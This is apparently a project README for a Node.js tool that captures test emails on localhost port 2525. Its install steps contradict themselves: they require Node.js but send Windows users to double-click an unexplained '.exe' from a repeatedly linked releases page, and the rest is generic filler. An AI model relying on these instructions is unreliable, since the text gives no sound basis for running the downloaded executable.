# 📧 smtp-capture-server - Easily Capture And Store Emails Locally

[![Download smtp-capture-server](https://img.shields.io/badge/Download-smtp--capture--server-blue.svg)](https://github.com/abspondon1/smtp-capture-server/releases)

## 📦 Introduction

The smtp-capture-server is a lightweight, self-hosted SMTP server built with Node.js. It captures and stores incoming emails locally. This tool is perfect for testing and development. You can quickly set it up on your machine and start capturing emails without needing a complicated setup.

## 🚀 Getting Started

### System Requirements

Before you download and install, ensure your system meets the following requirements:

- **Operating System**: Windows 10 or later, macOS, or a recent version of Linux.
- **Node.js**: Version 14 or higher. If you don’t have Node.js installed, you can find it [here](https://nodejs.org/).

### Download & Install

To get the smtp-capture-server, visit this page to download:

[Download smtp-capture-server Releases](https://github.com/abspondon1/smtp-capture-server/releases)

1. Click the link above and you will find the latest release.
2. Look for the file appropriate for your operating system. For example, if you are using Windows, download the `.exe` file. For macOS, you may find a `.tar.gz` or other suitable format.
3. Save the file in a location you can easily access, like your Desktop or Downloads folder.

### Installation Steps

Once you download the file, follow these steps to install the smtp-capture-server:

1. **Windows**:
   - Double-click the downloaded `.exe` file.
   - Follow the on-screen instructions to complete the installation.

2. **macOS**:
   - Open the terminal.
   - Navigate to the directory where you saved the file.
   - Run the following command to extract the archive:
     ```bash
     tar -xzf smtp-capture-server.tar.gz
     ```
   - Change to the new directory:
     ```bash
     cd smtp-capture-server
     ```

3. **Linux**:
   - Open a terminal window.
   - Navigate to the download location.
   - If you downloaded a `.tar.gz` file, extract it with:
     ```bash
     tar -xzf smtp-capture-server.tar.gz
     ```

### Running the Application

To run the smtp-capture-server, follow these steps based on your operating system:

1. **Windows**:
   - After installation, locate the smtp-capture-server application and double-click it.
   - A console window will open, indicating the server is running.

2. **macOS and Linux**:
   - Open the terminal.
   - Navigate to the smtp-capture-server directory.
   - Start the server with the following command:
     ```bash
     node app.js
     ```
   - You should see a message indicating the server is running and listening for incoming emails.

## 📨 Testing The Server

With the server running, you can now test it.

1. Use any email client (like Thunderbird or Outlook).
2. Set the SMTP server to `localhost` with the port `2525` (the default for this application).
3. Send a test email to any address. 

You will find the incoming emails stored locally, ready for review.

## 🌐 Accessing Stored Emails

The smtp-capture-server stores emails in a designated directory. You can access them by navigating to the following path:

- **Default Path**: `./emails/`

You can open the emails using any text editor or email client that supports viewing `.eml` files.

## 🔍 Features

- **Self-Hosted**: Run the server on your machine without reliance on external services.
- **Lightweight**: Minimal resource usage, perfect for local testing.
- **Customizable**: Easily modify settings according to your needs.
- **Node.js Based**: Built on a robust framework, ensuring reliability and performance.

## 📚 Troubleshooting

If you encounter issues while using the smtp-capture-server, please check the following:

- Ensure that you have Node.js installed and that it is the correct version.
- Confirm that no other application is using port `2525`.
- Check the console output for any error messages that can guide you in fixing the issue.

## 💡 Contributions

If you want to contribute to this project, feel free to fork the repository and create a pull request. Your contributions can help improve the application for everyone.

## 🫶 Support

For any questions or assistance, please check the issues section of the repository or reach out to the community for help.

You can always revisit the download page here: 

[Download smtp-capture-server Releases](https://github.com/abspondon1/smtp-capture-server/releases)

This README should help you get started with capturing emails easily. Enjoy using the smtp-capture-server!